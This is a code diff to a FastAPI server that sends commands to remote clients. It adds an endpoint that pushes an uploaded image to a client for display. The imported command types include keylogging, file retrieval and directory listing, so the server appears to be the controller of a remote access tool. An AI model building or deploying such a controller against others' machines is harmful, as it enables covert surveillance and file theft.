@@ -8,7 +8,8 @@ from fastapi import FastAPI, UploadFile, File
 
 import configurator
 from commands import PopupCommand, PopupParameters, BasicCommand, CommandType, KeyLogCommand, KeyLogParameters, \
-    GetFileCommand, GetFileParameters, DirListCommand, DirListParameters, PlaySoundCommand, PlaySoundParameters
+    GetFileCommand, GetFileParameters, DirListCommand, DirListParameters, PlaySoundCommand, PlaySoundParameters, \
+    DisplayImageParameters, DisplayImageCommand
 from protocol.requests import RequestHeader, RequestType, SendCommandRequest, SendCommandContent
 from protocol.responses import BasicResponse, SendCommandResponse
 
@@ -150,8 +151,25 @@ async def send_play_sound_command(client_id: str, sound_buffer: UploadFile = Fil
     )
 
 
+@app.put("/display-image")
+async def send_display_image_command(client_id: str, image_buffer: UploadFile = File(...)) -> BasicResponse:
+    return await make_command_request(
+        SendCommandRequest(
+            header=RequestHeader(
+                client_id=client_id,
+                request_type=RequestType.SendCommand
+            ),
+            content=SendCommandContent(command=DisplayImageCommand(
+                parameters=DisplayImageParameters(
+                    image_buffer=base64.b64encode(await image_buffer.read())
+                )
+            ))
+        )
+    )
+
+
 @app.get("/is-alive")
-def is_alive(client_id: str) -> BasicResponse:
+async def is_alive(client_id: str) -> BasicResponse:
     return await server.is_alive(client_id)
 
 
